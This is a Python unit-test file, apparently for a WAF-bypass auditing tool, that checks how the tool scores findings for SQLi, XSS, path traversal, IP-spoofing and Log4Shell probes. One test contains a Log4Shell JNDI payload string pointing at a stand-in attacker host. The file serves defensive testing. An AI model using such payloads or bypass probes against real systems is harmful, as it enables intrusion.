# © VampSecure Studios — VampSecure Labs Security Research Division
"""Tests unitarios para vamp-waf-bypass."""
from typing import Dict

from vamp_waf_bypass import (
    CHECKS,
    Finding,
    ProbeResult,
    _is_blocked,
    _waf_product,
    build_report,
    check_http_method_override,
    check_ip_spoof_headers,
    check_log4shell,
    check_null_byte,
    check_param_fragmentation,
    check_path_traversal_encoded,
    check_rate_limiting,
    check_sqli_double_encoded,
    check_sqli_inline_comment,
    check_sqli_url_encoded,
    check_useragent_whitelist,
    check_waf_absent,
    check_waf_disclosure,
    check_xss_case_variation,
    check_xss_html_entities,
    main,
    render_html,
)

# ─── Helpers ──────────────────────────────────────────────────────────────────

def ok(status: int = 200, body: str = "", headers: Dict[str, str] = None) -> ProbeResult:
    return ProbeResult(
        url="http://example.com", method="GET",
        status=status, headers=headers or {}, body=body, elapsed_ms=10.0,
    )


def blocked(status: int = 403, body: str = "access denied") -> ProbeResult:
    return ProbeResult(
        url="http://example.com", method="GET",
        status=status, headers={}, body=body, elapsed_ms=5.0,
    )


def err() -> ProbeResult:
    return ProbeResult(
        url="http://example.com", method="GET",
        status=0, headers={}, body="", elapsed_ms=0.0, error="connection refused",
    )


# ─── _is_blocked ──────────────────────────────────────────────────────────────

def test_is_blocked_403():
    assert _is_blocked(blocked(403)) is True


def test_is_blocked_406():
    assert _is_blocked(ok(406)) is True


def test_is_blocked_keyword():
    assert _is_blocked(ok(200, "Request blocked by WAF")) is True


def test_is_blocked_200_clean():
    assert _is_blocked(ok(200, "Welcome")) is False


def test_is_blocked_error():
    assert _is_blocked(err()) is False


# ─── _waf_product ─────────────────────────────────────────────────────────────

def test_waf_product_cloudflare():
    r = ok(200, headers={"CF-Ray": "abc123"})
    assert _waf_product(r) == "Cloudflare"


def test_waf_product_incapsula():
    r = ok(200, headers={"X-Iinfo": "12-3"})
    assert _waf_product(r) == "Incapsula"


def test_waf_product_none():
    assert _waf_product(ok(200)) is None


# ─── WAF-001: waf absent ──────────────────────────────────────────────────────

def test_waf_absent_detected():
    base = ok(200, "Welcome")
    mal = ok(200, "Welcome")
    f = check_waf_absent(base, mal)
    assert f is not None
    assert f.check_id == "WAF-001"
    assert f.severity == "high"


def test_waf_absent_blocked():
    base = ok(200, "Welcome")
    mal = blocked(403)
    assert check_waf_absent(base, mal) is None


def test_waf_absent_waf_header():
    base = ok(200, headers={"CF-Ray": "abc"})
    mal = ok(200)
    assert check_waf_absent(base, mal) is None


def test_waf_absent_error():
    assert check_waf_absent(err(), ok()) is None


# ─── WAF-002: SQLi URL encoded ────────────────────────────────────────────────

def test_sqli_url_encoded_bypass():
    base = ok(200)
    probe = ok(200)
    f = check_sqli_url_encoded(base, probe)
    assert f is not None
    assert f.check_id == "WAF-002"
    assert f.severity == "critical"


def test_sqli_url_encoded_blocked():
    assert check_sqli_url_encoded(ok(), blocked()) is None


def test_sqli_url_encoded_different_status():
    assert check_sqli_url_encoded(ok(200), ok(404)) is None


# ─── WAF-003: SQLi double encoded ────────────────────────────────────────────

def test_sqli_double_encoded_bypass():
    f = check_sqli_double_encoded(ok(), ok(200))
    assert f is not None
    assert f.check_id == "WAF-003"


def test_sqli_double_encoded_blocked():
    assert check_sqli_double_encoded(ok(), blocked()) is None


# ─── WAF-004: SQLi inline comment ────────────────────────────────────────────

def test_sqli_inline_comment_bypass():
    f = check_sqli_inline_comment(ok(), ok())
    assert f is not None
    assert f.check_id == "WAF-004"


def test_sqli_inline_comment_blocked():
    assert check_sqli_inline_comment(ok(), blocked(503, "firewall")) is None


# ─── WAF-005: XSS HTML entities ──────────────────────────────────────────────

def test_xss_html_entities_bypass():
    f = check_xss_html_entities(ok(), ok())
    assert f is not None
    assert f.check_id == "WAF-005"
    assert f.severity == "critical"


def test_xss_html_entities_blocked():
    assert check_xss_html_entities(ok(), blocked()) is None


# ─── WAF-006: XSS case variation ─────────────────────────────────────────────

def test_xss_case_bypass():
    f = check_xss_case_variation(ok(), ok())
    assert f is not None
    assert f.check_id == "WAF-006"
    assert f.severity == "high"


def test_xss_case_blocked():
    assert check_xss_case_variation(ok(), blocked()) is None


# ─── WAF-007: path traversal ─────────────────────────────────────────────────

def test_path_traversal_bypass():
    f = check_path_traversal_encoded(ok(), ok())
    assert f is not None
    assert f.check_id == "WAF-007"
    assert f.severity == "critical"


def test_path_traversal_blocked():
    assert check_path_traversal_encoded(ok(), blocked()) is None


# ─── WAF-008: HTTP method override ───────────────────────────────────────────

def test_method_override_bypass():
    f = check_http_method_override(ok(), ok(200))
    assert f is not None
    assert f.check_id == "WAF-008"
    assert f.severity == "medium"


def test_method_override_405_still_finding():
    f = check_http_method_override(ok(), ok(405))
    assert f is not None


def test_method_override_blocked():
    assert check_http_method_override(ok(), blocked()) is None


# ─── WAF-009: IP spoof ────────────────────────────────────────────────────────

def test_ip_spoof_bypass():
    f = check_ip_spoof_headers(ok(200), ok(200), ok(200))
    assert f is not None
    assert f.check_id == "WAF-009"
    assert f.severity == "high"


def test_ip_spoof_one_blocked():
    f = check_ip_spoof_headers(ok(200), blocked(403), ok(200))
    assert f is not None
    ev = f.evidence[0]
    assert "X-Real-IP" in ev


def test_ip_spoof_all_blocked():
    assert check_ip_spoof_headers(ok(200), blocked(), blocked()) is None


# ─── WAF-010: UA whitelist ────────────────────────────────────────────────────

def test_ua_whitelist_bypass():
    f = check_useragent_whitelist(ok(), blocked(), ok(200))
    assert f is not None
    assert f.check_id == "WAF-010"
    assert f.severity == "medium"


def test_ua_whitelist_both_blocked():
    assert check_useragent_whitelist(ok(), blocked(), blocked()) is None


def test_ua_whitelist_neither_blocked():
    assert check_useragent_whitelist(ok(), ok(), ok()) is None


# ─── WAF-011: Log4Shell ───────────────────────────────────────────────────────

def test_log4shell_bypass():
    f = check_log4shell(ok(), ok())
    assert f is not None
    assert f.check_id == "WAF-011"
    assert f.severity == "critical"
    assert "jndi" in f.evidence[0].lower()


def test_log4shell_blocked():
    assert check_log4shell(ok(), blocked()) is None


# ─── WAF-012: Null byte ───────────────────────────────────────────────────────

def test_null_byte_bypass():
    f = check_null_byte(ok(), ok())
    assert f is not None
    assert f.check_id == "WAF-012"
    assert f.severity == "high"


def test_null_byte_blocked():
    assert check_null_byte(ok(), blocked()) is None


# ─── WAF-013: Param fragmentation ────────────────────────────────────────────

def test_param_fragmentation_bypass():
    f = check_param_fragmentation(ok(200), ok(200))
    assert f is not None
    assert f.check_id == "WAF-013"
    assert f.severity == "high"


def test_param_fragmentation_different_status():
    assert check_param_fragmentation(ok(200), ok(404)) is None


def test_param_fragmentation_blocked():
    assert check_param_fragmentation(ok(), blocked()) is None


# ─── WAF-014: Rate limiting ───────────────────────────────────────────────────

def test_rate_limiting_missing():
    probes = [ok(200) for _ in range(8)]
    f = check_rate_limiting(probes)
    assert f is not None
    assert f.check_id == "WAF-014"
    assert f.severity == "medium"


def test_rate_limiting_present():
    probes = [ok(200)] * 5 + [ok(429)] * 3
    assert check_rate_limiting(probes) is None


def test_rate_limiting_503():
    probes = [ok(200)] * 6 + [ok(503, "rate limit")] * 2
    assert check_rate_limiting(probes) is None


def test_rate_limiting_empty():
    assert check_rate_limiting([]) is None


# ─── WAF-015: Disclosure ──────────────────────────────────────────────────────

def test_waf_disclosure_version():
    r = ok(200, headers={"Server": "Apache/2.4.51"})
    f = check_waf_disclosure(r)
    assert f is not None
    assert f.check_id == "WAF-015"
    assert f.severity == "low"
    assert "apache/2.4.51" in f.evidence[0].lower()


def test_waf_disclosure_no_version():
    r = ok(200, headers={"Server": "cloudflare"})
    assert check_waf_disclosure(r) is None


def test_waf_disclosure_error():
    assert check_waf_disclosure(err()) is None


# ─── Report ───────────────────────────────────────────────────────────────────

def test_build_report_structure():
    findings = [
        Finding.from_check("WAF-002", ["evidence"]),
        Finding.from_check("WAF-014", []),
    ]
    r = build_report("https://example.com", findings, "CASE-001", "Tester")
    assert r["summary"]["critical"] == 1
    assert r["summary"]["medium"] == 1
    assert r["summary"]["total"] == 2
    assert r["target"] == "https://example.com"


def test_render_html_contains_finding():
    findings = [Finding.from_check("WAF-011", ["${jndi:ldap://attacker.example.com}"])]
    report = build_report("https://target.com", findings)
    h = render_html(report)
    assert "WAF-011" in h
    assert "jndi" in h.lower()
    assert "critical" in h.lower()


def test_render_html_no_findings():
    h = render_html(build_report("https://ok.com", []))
    assert "No bypasses detected" in h


# ─── Finding.from_check ───────────────────────────────────────────────────────

def test_finding_from_check_all_checks():
    for cid in CHECKS:
        f = Finding.from_check(cid)
        assert f.check_id == cid
        assert f.severity in {"critical", "high", "medium", "low"}
        assert f.title


# ─── Exit codes ──────────────────────────────────────────────────────────────

def test_exit_codes_bypass_detection(monkeypatch, tmp_path):
    """main() retorna 1 cuando hay hallazgos medium (sin llegar a critical)."""
    import vamp_waf_bypass

    def mock_scan(target, **_):
        return [Finding.from_check("WAF-014")]

    monkeypatch.setattr(vamp_waf_bypass, "scan", mock_scan)
    code = main(["https://example.com", "--quiet"])
    assert code == 1


def test_exit_codes_critical(monkeypatch):
    import vamp_waf_bypass

    def mock_scan(target, **_):
        return [Finding.from_check("WAF-002")]

    monkeypatch.setattr(vamp_waf_bypass, "scan", mock_scan)
    code = main(["https://example.com", "--quiet"])
    assert code == 2


def test_exit_codes_clean(monkeypatch):
    import vamp_waf_bypass

    monkeypatch.setattr(vamp_waf_bypass, "scan", lambda *a, **kw: [])
    code = main(["https://example.com", "--quiet"])
    assert code == 0


# ─── v1.1.0 — --watch ────────────────────────────────────────────────────────

def test_watch_argument_in_help():
    """--watch debe aparecer en el texto de ayuda."""
    import io
    import sys as _sys

    buf = io.StringIO()
    try:
        import vamp_waf_bypass as _m
        import argparse as _ap
        p = _ap.ArgumentParser()
        p.add_argument("target")
        p.add_argument("--param", default="q")
        p.add_argument("--rate-n", type=int, default=8)
        p.add_argument("--json", metavar="FILE")
        p.add_argument("--html", metavar="FILE")
        p.add_argument("--severity", nargs="+")
        p.add_argument("--case", default="")
        p.add_argument("--analyst", default="")
        p.add_argument("--quiet", action="store_true")
        p.add_argument("--watch", type=int, metavar="SECONDS")
        p.add_argument("--version", action="version", version="test")
        help_text = p.format_help()
        assert "--watch" in help_text
    except _ap.ArgumentError:
        pass
